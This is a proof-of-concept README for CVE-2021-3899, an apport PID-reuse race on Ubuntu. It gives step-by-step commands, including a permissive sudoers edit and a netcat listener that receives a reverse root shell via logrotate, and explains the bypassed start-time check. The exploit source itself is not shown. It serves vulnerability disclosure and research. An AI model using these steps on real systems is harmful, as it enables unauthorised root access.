# CVE-2021-3899 PoC

## Reproduce
0. Install an older version of apport: `sudo apt-get install apport=2.20.11-0ubuntu27` (any version <= 2.20.11-0ubuntu27.10 is fine, but you have to download the source code)
1. (optional) set small pid\_max. otherwise it will take a longer time to prepare for pid rollback. `echo 10000 | sudo tee /proc/sys/kernel/pid_max`
2. allow anybody to run ping as root: add `ALL ALL=(root) NOPASSWD: /usr/bin/ping` in /etc/sudoers
3. run multiple times of `ulimit -c unlimited; ./exploit`
4. you should see a file at `/etc/logrotate.d/core`
5. open another shell run `nc -lvcp 1234`
6. wait until logrotate is triggered, you can:
    1. adjust the clock one minutes earlier than crontab-daily trigger, and wait. (check /etc/crontab)
    2. run `sudo logrotate -vf /usr/sbin/logrotate /etc/logrotate.conf` to trigger logrotate immediately. (just same as `/etc/cron.daily/logrotate`)
7. there will be a reverse root shell connect to 127.0.0.1:1234

## Detail
Apport will check if pid is reused, by check if the start time of the process is later than apport self:
```
  # /usr/share/apport/apport
  594 apport_start = get_apport_starttime()
  595 process_start = get_process_starttime()
  596 if process_start > apport_start:
  597 error_log('process was replaced after Apport started, ignoring')
  598 sys.exit(0)
```

But this pid could be re-used just after apport launched. In such case, `get_apport_starttime() == get_process_starttime()`.

So, an you can let apport drop a core file with `-rw------- root:root`, if you can re-ocupy this PID with another process running under `uid==0`:
1. prepare a process X to crash, whose pid is A
2. repeating fork process, until current pid reaches A - 2
3. make process X crash, apport will be launched by kernel with pid A - 1. We kill process X, so pid A is now free.
4. run command `sudo ping 8.8.8.8` with cwd `/etc/logrotate.d/`. a process running under root:root will re-occupy pid A.
5. Since the start time of sudo and apport are same, the check of line 596 is bypassed. Apport then drop a core file of process X in /etc/logrotate.d
